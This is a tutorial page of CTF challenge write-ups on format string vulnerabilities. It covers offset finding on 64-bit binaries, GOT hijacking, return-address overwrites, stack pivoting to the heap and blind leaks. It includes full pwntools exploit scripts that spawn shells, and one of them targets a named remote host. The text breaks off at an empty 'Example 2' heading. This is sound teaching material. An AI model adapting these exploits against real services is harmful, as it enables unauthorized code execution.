# Examples

The following will introduce some CTF challenges involving format string vulnerabilities. These are all common exploitations of format string vulnerabilities.

## 64-bit Program Format String Vulnerability

### Principle

The offset calculation for 64-bit programs is actually similar to 32-bit — both compute the corresponding parameters. The only difference is that the first 6 arguments of a 64-bit function are stored in the corresponding registers. So what about format string vulnerabilities? Although we do not place data into the corresponding registers, the program will still parse them according to the corresponding format of the format string.

### Example

Here we use [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2017-UIUCTF-pwn200-GoodLuck) from UIUCTF 2017 as an example. Since only a local environment is available, I set up a flag.txt file locally.

#### Determining Protections

```shell
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can see that the program has NX protection and partial RELRO protection enabled.

#### Analyzing the Program

We can see that the vulnerability in the program is very obvious:

```C
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```

#### Determining the Offset

We set a breakpoint at printf as follows. Here we only focus on the code section and stack section.

```shell
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: No such file or directory.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────


```

We can see that the offset of the flag on the stack is 5. Excluding the first line which is the return address, its offset is 4. Furthermore, since this is a 64-bit program, the first 6 arguments are stored in the corresponding registers. The fmt string is stored in the RDI register, so the offset of the fmt string's corresponding address is 10. Since `%order$s` in the fmt string corresponds to the order of the arguments after the fmt string, we only need to input `%9$s` to obtain the content of the flag. Of course, there is an even simpler method: using fmtarg from https://github.com/scwuaptx/Pwngdb to determine the offset of a specific argument.

```shell
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

Note that we must break at printf.

#### Exploit Program

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

## hijack GOT

### Principle

In current C programs, functions from libc are all called through the GOT table. Furthermore, when RELRO protection is not fully enabled, each libc function's corresponding GOT table entry can be modified. Therefore, we can modify the GOT table content of a certain libc function to the address of another libc function to control the program. For example, we can modify the GOT table entry of printf to the address of the system function. This way, when the program executes printf, it actually executes the system function.

Assuming we overwrite the address of function A with the address of function B, this attack technique can be divided into the following steps:

-   Determine the GOT table address of function A.

    -   The function A we exploit generally already exists in the program, so we can use simple address-finding methods to locate it.

-   Determine the memory address of function B.

    -   This step usually requires us to find a way to leak the address of function B.

-   Write the memory address of function B into the GOT table address of function A.

    -   This step generally requires us to use a vulnerability in a function to trigger it. Common exploitation methods include:

        -   Write function: the write function.
        -   ROP

        ```text
        pop eax; ret; 			# printf@got -> eax
        pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
        add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
        ```

        -   Format string arbitrary address write

### Example

Here we use [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2016-CCTF-pwn3) from 2016 CCTF as an example.

#### Determining Protections

As follows:

```shell
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can see that the program mainly has NX protection enabled. We generally assume that ASLR protection is enabled on the remote server by default.

#### Analyzing the Program

First, analyzing the program, we can find that it appears to mainly implement an FTP that requires a password to log in, with three basic functions: get, put, and dir. After roughly browsing the code for each function, we find a format string vulnerability in the get function:

```C
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

#### Exploitation Strategy

Since we have a format string vulnerability, we can determine the following exploitation strategy:

- Bypass the password
- Determine the format string parameter offset
- Use put@got to obtain the put function address, then determine the corresponding libc.so version, and subsequently obtain the corresponding system function address.
- Modify the content of puts@got to the address of system.
- When the program executes the puts function again, it actually executes the system function.

#### Exploit Program

As follows:

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```

Notes:

- When obtaining the puts function address, I used an offset of 8 because I wanted the first 4 bytes of my output to be the puts function address. The actual offset of the format string's starting address is 7.
- Here I used the fmtstr\_payload function from pwntools, which conveniently obtains the result we want. Interested readers can check the official documentation. For example, fmtstr\_payload(7, {puts\_got: system\_addr}) means that the format string offset is 7, and I want to write system\_addr at the puts\_got address. By default, it writes byte by byte.

## hijack retaddr

### Principle

This is easy to understand — we want to use a format string vulnerability to hijack the program's return address to an address we want to execute.

### Example

Here we use [三个白帽-pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/三个白帽-pwnme_k0) as an example for analysis.

#### Determining Protections

```shell
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can see that the program mainly has NX protection and Full RELRO protection enabled. This means we cannot modify the program's GOT table.

#### Analyzing the Program

After simple analysis, we can see that the program appears to mainly implement some kind of account registration functionality, with modify and view features. We then find a format string vulnerability in the view function:

```C
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}
```

The output content is &a4 + 4. Tracing back, we find that the password content we read in is also:

```C
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

We can also find that the distance between username and password is 20 bytes.

```C
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```

OK, that's about it. Also, we can see that the account/password matching doesn't really matter.

#### Exploitation Strategy

Our ultimate goal is to obtain a system shell so we can get the flag. We can find that in the given file, at address 0x00000000004008A6, there is a function that directly calls system('bin/sh') (regarding this discovery, we generally look through the program roughly first). So if we modify some function's return address to this address, it's equivalent to getting a shell.

Although the memory that stores the return address itself changes dynamically, its address relative to rbp does not change, so we can use relative addresses for calculation. The exploitation strategy is as follows:

- Determine the offset
- Obtain the function's rbp and return address
- Calculate the address where the return address is stored based on the relative offset
- Write the address of the system function call to the address where the return address is stored.

#### Determining the Offset

First, let's determine the offset. Enter the username as aaaaaaaa, enter any password, and set a breakpoint at the printf(&a4 + 4) function that outputs the password:

```text
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...
```

At this point, the stack looks like this:

```text
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

We can see that the username we entered is at the third position on the stack. So excluding the format string's own position, its offset is 5 + 3 = 8.

#### Modifying the Address

Let's take a closer look at the stack information at the breakpoint:

```text
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

We can see that the second position on the stack stores the function's return address (which is actually the value stored by `push rip` when calling the show account function), with an offset of 7 in the format string.

At the same time, the first element on the stack stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Therefore, if we know the value of rbp, we know the address of the function's return address.

0x0000000000400d74 and 0x00000000004008A6 differ only in the low 2 bytes, so we only need to modify the 2 bytes starting at 0x00007fffffffdb48.

It should be noted that on some newer systems (such as Ubuntu 18.04), directly modifying the return address to 0x00000000004008A6 may cause the program to crash. In that case, consider modifying the return address to 0x00000000004008AA, which directly calls system("/bin/sh"):

```assembly
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
```

#### Exploit Program
```python
from pwn import *
context.log_level="debug"
context.arch="amd64"

sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))


sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
```

## Format String Vulnerability on the Heap

### Principle

A format string vulnerability on the heap refers to the format string itself being stored on the heap. This mainly increases the difficulty of obtaining the corresponding offset. Generally speaking, such format strings are very likely to be copied onto the stack.

### Example

Here we use [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2015-CSAW-contacts) from 2015 CSAW as an example.

#### Determining Protections

```shell
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can see that the program not only has NX protection enabled but also Canary.

#### Analyzing the Program

A brief look at the program reveals that, as the name describes, it is a contact-related program that can create, modify, delete, and print contact information. Upon closer reading, we can find that there is a format string vulnerability when printing contact information.

```C
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
```

Looking more carefully, we can see that this format actually points to the heap.

#### Exploitation Strategy

Our basic goal is to get a system shell to capture the flag. Since there is a format string vulnerability, we should be able to control the program flow by hijacking the GOT table or controlling the program's return address. However, neither is very feasible here. The reasons are as follows:

- The reason we cannot hijack the GOT to control program flow is that the only function in the program that outputs our given string is the printf function. We can only choose it to construct /bin/sh to make it execute system('/bin/sh'), but the printf function is used elsewhere in the program as well, which would cause the program to crash directly.
- The reason we cannot directly control the program return address to control program flow is that we don't have a directly executable memory region to store our content. Also, using a format string to write system\_addr + 'bbbb' + addr of '/bin/sh' directly onto the stack seems unrealistic.

So what can we do? We still have the technique we discussed in stack overflow — stack pivoting. And here, what we can control happens to be heap memory, so we can pivot the stack to the heap. Here we use the `leave` instruction for stack pivoting, so before pivoting we need to modify the program's saved ebp value to the value we want. Only then, when executing the `leave` instruction, will esp become the value we want. At the same time, since we are using a format string to make the modification, we need to know the address where ebp is saved. However, the address where ebp is stored in the PrintInfo function changes each time, and we have no other way to determine it. But, **the ebp value pushed onto the stack actually stores the address of the saved ebp of the previous function**, so we can modify the **saved ebp of its parent function, i.e., the ebp value of the grandparent function (the main function)**. This way, when the parent function returns, the stack pivoting to the heap is achieved.

The basic strategy is as follows:

-   First, obtain the address of the system function.
    -   Determine it by leaking the address of a libc function and using the libc database.
-   Construct the basic contact description as system\_addr + 'bbbb' + binsh\_addr.
-   Modify the saved ebp of the parent function (i.e., the ebp of the grandparent function) to **the address storing system\_addr minus 4**.
-   When the main program returns, the following operations occur:
    -   `mov esp, ebp` — makes esp point to system\_addr's address minus 4.
    -   `pop ebp` — makes esp point to system\_addr.
    -   `ret` — makes eip point to system\_addr, thus obtaining a shell.

#### Obtaining Related Addresses and Offsets

Here we mainly obtain the system function address, /bin/sh address, the address on the stack that stores the contact description, and the address of the PrintInfo function.

First, we use the libc\_start\_main\_ret address stored on the stack (this address is the function that will run when the main function returns) to obtain the system function address and /bin/sh address. We construct the corresponding contact, then choose to output the contact information, set a breakpoint at printf, and keep running until we reach the printf function with the format string vulnerability, as follows:

```shell
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
[#1] 0x8048c27 → leave 
[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
[#3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
[#5] 0x80485e1 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $esp 140
['$esp', '140']
1
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
gef➤  dereference $esp l140
['$esp', 'l140']
140
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
0xffffcd24│+0x28: 0x00002b67 ("g+"?)
0xffffcd28│+0x2c: 0x0804c410  →  "11111"
0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd3c│+0x40: 0x00000000
0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
0xffffcd44│+0x48: 0x00000000
0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
0xffffcd58│+0x5c: 0x00000050 ("P"?)
0xffffcd5c│+0x60: 0x00000000
0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
0xffffcd64│+0x68: 0x08048288  →  0x00000082
0xffffcd68│+0x6c: 0x00000004
0xffffcd6c│+0x70: 0x0000000a
0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
0xffffcd78│+0x7c: 0x00000000
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
0xffffcd80│+0x84: 0x00000001
0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
```

Through simple analysis, we can determine that:

```
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
```

This stores the return address of __libc_start_main. Using fmtarg to get the corresponding offset, we can see that its offset is 32, so the offset relative to the format string is 31.

```shell
gef➤  fmtarg 0xffffcd7c
The index of format argument : 32
```

This way we can obtain the corresponding address. Then we can use libc-database to get the corresponding libc, and subsequently obtain the system function address and /bin/sh address.

Next, we can determine that the address on the stack storing the format string, 0xffffcd2c, has an offset of 11 relative to the format string. We get this in order to find the starting memory address of the Description of the specified contact in the heap. We store the format string [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] in the Description of the specified contact.

Furthermore, we can see that the address below stores the call address of the parent function, with an offset of 6 relative to the format string. This allows us to directly modify the saved ebp of the parent function.

```shell
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
```

#### Constructing a Contact to Get the Heap Address

After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.

```text
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

to obtain the corresponding addresses. The trailing bbbb is for convenient string reception.

Here, since the stack space allocated and released during function calls is consistent, the ebp address we obtain will not change when we call the function again.

In some environments, the system address may contain \x00, causing printf to encounter a null termination and preventing the leaking of both addresses. Therefore, the payload can be modified as follows:

```text
[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
```

If the payload is modified like this, an offset of 12 needs to be added on the heap. This ensures that the null termination occurs after the leak.

#### Modifying ebp

Since we need to execute the `mov` instruction to assign ebp to esp, and then execute `pop ebp` before executing the `ret` instruction, we need to modify ebp to the value of the address storing the system address minus 4. This way, after `pop ebp`, esp will point exactly to the address where system is stored, and executing the `ret` instruction at that point will execute the system function.

We already know the ebp value we want to modify, and we also know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value.

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
```

#### Getting a Shell

At this point, after the format string function finishes executing and returns to the grandparent function, we input 5 to exit the program. This will execute the `ret` instruction, and we can get a shell.

#### Exploit Program

```python
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')


def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)


def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')


## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)

## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()
```
For the case where system has null truncation, the exp is as follows:
```python
from pwn import *
context.log_level="debug"
context.arch="x86"

io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc

def createcontact(io, name, phone, descrip_len, description):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('1')
	sh.recvuntil('Contact info: \n')
	sh.recvuntil('Name: ')
	sh.sendline(name)
	sh.recvuntil('You have 10 numbers\n')
	sh.sendline(phone)
	sh.recvuntil('Length of description: ')
	sh.sendline(descrip_len)
	sh.recvuntil('description:\n\t\t')
	sh.sendline(description)
def printcontact(io):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('4')
	sh.recvuntil('Contacts:')
	sh.recvuntil('Description: ')

#gdb.attach(io)

createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))

payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))

part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()
```

It should be noted that this approach does not reliably yield a shell because we are inputting a string that is too long at once. But we have no way to control the address we want to input earlier. This is the only way.

Why do we need to print so much? Because the format string is not on the stack, even if we obtain the address of the ebp we need to change, we have no way to write this address onto the stack and use the $ symbol to locate it. Since we can't locate it, we can't use l/ll and similar methods to write this address, so we can only print a lot.

## Blind Format String Exploitation

### Principle

Blind format string exploitation refers to being given only an IP address and port for interaction, without the corresponding binary file for pwning. This is actually similar to BROP, except BROP exploits stack overflow while here we exploit a format string vulnerability. Generally, we follow these steps:

- Determine the program's bitness
- Determine the vulnerability location
- Exploit

Since I couldn't find a challenge that provided source code after the competition, I simply constructed two challenges myself.

### Example 1 - Leaking the Stack

The source code and deployment files are all in the corresponding folder [fmt_blind_stack](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/blind_fmt_stack).

#### Determining the Program's Bitness

We casually input %p, and the program responds with the following information:

```shell
➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
%p
0x7ffd4799beb0
G�flag is on the stack%                          
```

It tells us the flag is on the stack. We also know that the program is 64-bit and there should be a format string vulnerability.

#### Exploitation

So let's test bit by bit:

```python
from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1

```

In the end, after simply looking through the output, we got the flag:

```shell
////////
////////
\x00\x00\x00\x00\x00\x00\x00\xff
flag{thi
s_is_fla
g}\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\xfe\x7f\x00\x00
```

### Example 2 - Blind GOT Hijacking

